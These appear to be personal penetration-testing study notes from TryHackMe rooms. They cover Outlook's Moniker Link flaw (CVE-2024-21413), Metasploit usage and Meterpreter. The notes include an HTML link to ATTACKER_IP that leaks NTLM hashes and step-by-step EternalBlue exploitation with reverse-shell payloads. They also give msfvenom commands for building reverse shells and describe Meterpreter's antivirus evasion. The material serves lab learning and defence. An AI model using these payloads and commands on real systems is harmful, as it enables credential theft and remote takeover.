# Exploitation Basics

## Moniker
A **moniker** in Windows is a COM (Component Object Model) object reference that allows applications to dynamically locate and bind to other objects.  
- Acts like a pointer or "name" for COM objects.  
- Used in technologies such as **OLE (Object Linking and Embedding)**, **ActiveX**, and scripting environments.  
- Attackers can abuse monikers to execute arbitrary code when a document (e.g., a Word file) is opened.

---

## Link
Links in documents (like **OLE objects** or **embedded hyperlinks**) can be exploited:  
- Malicious documents may include links that, when clicked, automatically execute commands.  
- Outlook can render emails as HTML and parse links such as `http://` and `https://`.  
- It can also handle `file://` **Moniker Links**, which can point to files or resources on remote systems.  
- Normally, Outlook’s **Protected View** prompts users before opening external applications, blocking malicious actions.  

**Example of a basic Moniker Link:**
```html
<a href="file://ATTACKER_IP/test">Click me</a>
```

By modifying the link to include the `!` character, attackers can bypass Outlook’s Protected View:
```html
<a href="file://ATTACKER_IP/test!exploit">Click me</a>
```
Even if the share does not exist, Outlook will attempt an SMB authentication, leaking the victim’s **Windows NetNTLMv2 hash**.

## CVE-2024-21413 (Moniker Link)
- **Discovered by:** Haifei Li, Check Point Research  
- **Announced:** February 13th, 2024  
- **Type:** Remote Code Execution (RCE) & NTLM Credential Leak  

### Description
This vulnerability allows attackers to bypass Outlook’s security mechanisms when handling **Moniker Links**.  
When exploited, Outlook may send NTLM credentials to an attacker-controlled server, even if the malicious link is clicked in **Protected View**.

### Impact
- Theft of **NTLM hashes** and user credentials.  
- Potential for **remote code execution** due to COM object abuse.  
- Increased risk of **phishing and lateral movement** in corporate environments.  

### Proof of Concept (PoC) Overview
> **Note:** This is a high-level summary of the PoC; not executable instructions.

- Attacker crafts an email with a malicious Moniker Link.  
- Victim opens or previews the email in Outlook.  
- Outlook attempts to load a file via `file://` using SMB.  
- This triggers an **authentication attempt**, leaking the victim’s **NetNTLMv2 hash**.  
- An attacker could capture and attempt to crack these hashes with tools like *Responder* or *Impacket*.  

---

## Remediation
Microsoft released official patches for this vulnerability in **February 2024 Patch Tuesday**.  
Recommended actions:
- Apply the latest **Microsoft security updates** via Windows Update or the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/).  
- Disable automatic link preview in Outlook where possible.  
- Block outbound **SMB traffic** at the firewall, if feasible.  
- Educate users not to click unknown or suspicious links in emails.  
- Encourage reporting of suspicious emails to the security team.

# TryHackMe: Metasploit Introduction

**Completion Date:** September 11, 2025  
**Platform:** [TryHackMe](https://tryhackme.com/)  
**Room:** Metasploit: Introduction  

---

## Overview
Metasploit is the most widely used exploitation framework. It is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.

---

## Versions
- **Metasploit Pro**: Commercial version with a GUI, focused on automation and management.  
- **Metasploit Framework**: Open-source command-line version. Most commonly used in penetration testing distributions.

---

## Components of Metasploit
- **msfconsole** – the main CLI interface  
- **Modules** – includes exploits, scanners, payloads, etc.  
- **Tools** – e.g., `msfvenom`, `pattern_create`, `pattern_offset`  

### Module Types
- **Auxiliary** – scanners, crawlers, fuzzers  
- **Encoders** – obfuscate payloads to bypass AV  
- **Evasion** – modules to evade antivirus  
- **Exploits** – organized by OS and application type  
- **NOPs** – No Operation instructions, used for buffer consistency  
- **Payloads** – code executed on target systems (singles, stagers, stages, adapters)  
- **Post** – post-exploitation modules

---

## Key Concepts
- **Exploit**: Code leveraging a vulnerability  
- **Vulnerability**: Weakness in design, code, or logic  
- **Payload**: Malicious code executed on the target (e.g., reverse shells, Meterpreter)

---

## msfconsole
- Start with `msfconsole`  
- Context-sensitive: parameters reset unless set globally  
- Key commands:  
  - `use <module>` – load module  
  - `show options` – list module parameters  
  - `set/unset` – set or clear options  
  - `setg/unsetg` – set/unset global options  
  - `info` – detailed module information  
  - `search <term>` – search modules  
  - `exploit` or `run` – execute module  
  - `back` – exit module context  
  - `sessions` – manage active sessions  
  - `sessions -i <id>` – interact with session  

---

## Example Exploit: EternalBlue (MS17-010)
- **Exploit Path:** `exploit/windows/smb/ms17_010_eternalblue`  
- Steps:  
  1. `use exploit/windows/smb/ms17_010_eternalblue`  
  2. `set RHOSTS <target-ip>`  
  3. `set PAYLOAD windows/x64/meterpreter/reverse_tcp`  
  4. `set LHOST <your-ip>`  
  5. `exploit`  

Result: Spawns a Meterpreter session on the target.

---

## Sessions
- **Background session**: `background` or `CTRL+Z`  
- **List sessions**: `sessions`  
- **Interact with session**: `sessions -i <id>`  

---

## Summary
Metasploit simplifies the exploitation process into three steps:  
1. Find an exploit  
2. Configure/customize exploit  
3. Launch and gain access  

It provides a comprehensive toolkit for penetration testers and researchers, from scanning to post-exploitation.

# TryHackMe: Metasploit – Exploitation (Notes)

## Port Scanning

Metasploit has multiple modules for scanning open ports on target systems and networks. You can list them using:

```
search portscan
```

**Key Options:**

* **CONCURRENCY**: Number of targets scanned simultaneously
* **PORTS**: Port range to scan (e.g., `1-1000`). Note: `1-1000` in Metasploit ≠ Nmap’s top 1000 ports (Metasploit scans 1–10000 by default).
* **RHOSTS**: Target IP or network range.
* **THREADS**: Number of concurrent threads (higher = faster).

➡️ You can also run Nmap scans directly from `msfconsole` using `db_nmap`, which automatically saves results into the Metasploit database.

## UDP Service Identification

* Use the module:

  ```
  use auxiliary/scanner/discovery/udp_sweep
  ```
* This quickly identifies UDP services (e.g., **DNS**, **NetBIOS**), but is not as thorough as a full Nmap UDP scan.
* NetBIOS names may reveal machine roles (e.g., `CORP-DC`, `DEVOPS`, `SALES`). Some shares may even be open or weakly protected (e.g., `admin`, `root`, `toor`).

## SMB Scans

Metasploit includes SMB‑focused auxiliary modules:

* **smb\_enumshares** → Lists SMB shares.
* **smb\_version** → Identifies SMB service version.

These are especially useful in corporate environments for quickly detecting misconfigurations or known SMB vulnerabilities (like **MS17‑010 / EternalBlue**).

## Metasploit Database

Metasploit integrates with a PostgreSQL database for managing scan results:

1. Start PostgreSQL:

   ```bash
   sudo systemctl start postgresql
   ```
2. Initialize the database:

   ```bash
   sudo -u postgres msfdb init
   ```

   *(On TryHackMe’s AttackBox, this is pre-configured.)*
3. Use `db_status` inside `msfconsole` to confirm connection.
4. Manage workspaces with:

   * `workspace` → list workspaces
   * `workspace -a <name>` → add a new workspace
   * `workspace -d <name>` → delete a workspace
5. Run Nmap with database integration:

   ```
   db_nmap -sV 10.10.x.x
   ```
6. Review results:

   * `hosts` → list discovered hosts
   * `services` → list identified services
   * `hosts -R` → set discovered hosts as `RHOSTS`

## Example Workflow

1. Run Nmap with database:

   ```
   db_nmap -sV 10.10.138.32
   ```
2. Use MS17‑010 scanner:

   ```
   use auxiliary/scanner/smb/smb_ms17_010
   set RHOSTS 10.10.138.32
   run
   ```
3. If vulnerable, select payload:

   ```
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST <your_IP>
   set LPORT <your_port>
   run
   ```
4. Background sessions: `CTRL+Z`
5. List sessions: `sessions -l`
6. Interact with session: `sessions -i <id>`

## Msfvenom – Payload Generation

`msfvenom` (replacement for `msfpayload` + `msfencode`) generates payloads in various formats.

**Common Payload Examples:**

* Linux ELF:

  ```bash
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
  chmod +x rev_shell.elf
  ./rev_shell.elf
  ```
* Windows EXE:

  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
  ```
* PHP Reverse Shell:

  ```bash
  msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
  ```
* ASP Shell:

  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
  ```
* Python Reverse Shell:

  ```bash
  msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
  ```

**Encoders:**

* Set with `-e <encoder>`.
* Primarily encode payloads to avoid bad characters (not guaranteed to bypass AV).

## Key Takeaways

* Metasploit isn’t always the fastest for scanning, but it has powerful auxiliary modules for quick checks.
* The **database integration** makes handling multiple hosts and services much easier.
* Understanding the underlying vulnerabilities (e.g., SMB exploits like **MS17‑010**) is just as important as running the tools.
* **Msfvenom** allows custom payload creation in many formats (ELF, EXE, PHP, ASP, Python, etc.).
* Success with Metasploit requires not just tool usage but strong foundational knowledge of services, protocols, and vulnerabilities.

# Introduction to Meterpreter

## Overview

Meterpreter is a **Metasploit payload** that supports the penetration
testing process with many valuable components.\
It runs on the target system and acts as an **agent within a
command-and-control (C2) architecture**, allowing you to interact with
the operating system, browse files, and execute specialized commands.

Meterpreter has multiple **versions** that provide different
functionalities depending on the target system.

------------------------------------------------------------------------

## 🔧 How Meterpreter Works

-   **In-memory execution**: Runs in RAM instead of being written to
    disk (helps avoid antivirus detection).\
-   **Stealth**: Appears as a normal process (e.g., `spoolsv.exe`), not
    a suspicious executable like `meterpreter.exe`.\
-   **Encrypted communication**: Uses TLS to talk back to the Metasploit
    server. If network monitoring tools don't decrypt this traffic, they
    may miss it.\
-   **Antivirus evasion**: Even though many AV tools can detect
    Meterpreter, running in-memory makes it harder to catch.

------------------------------------------------------------------------

## 🔍 Example: MS17-010 Exploit

After exploiting a Windows machine using the **MS17-010 EternalBlue
vulnerability**, Meterpreter was running under PID **1304** as
`spoolsv.exe`.

``` bash
meterpreter > getpid
Current pid: 1304

meterpreter > ps
PID   PPID  Name         Arch  Session  User
----  ----  ----         ----  -------  ----
1304  692   spoolsv.exe  x64   0        NT AUTHORITY\SYSTEM
```

Even when listing DLLs for the process, you won't see a
`meterpreter.dll`, which makes it stealthier.

------------------------------------------------------------------------

## 🧩 Meterpreter Flavors

Metasploit payloads come in two main types:\
- **Staged**: Delivered in parts (small stager first, then downloads the
full payload).\
- **Inline (single)**: Entire payload delivered at once.

Meterpreter supports many target platforms, including:\
- Android\
- iOS\
- Java\
- Linux\
- macOS (OSX)\
- PHP\
- Python\
- Windows

### Listing Meterpreter Payloads

``` bash
msfvenom --list payloads | grep meterpreter
```

This command shows available Meterpreter payloads for different
platforms (reverse TCP, HTTPS, bind shell, etc.).
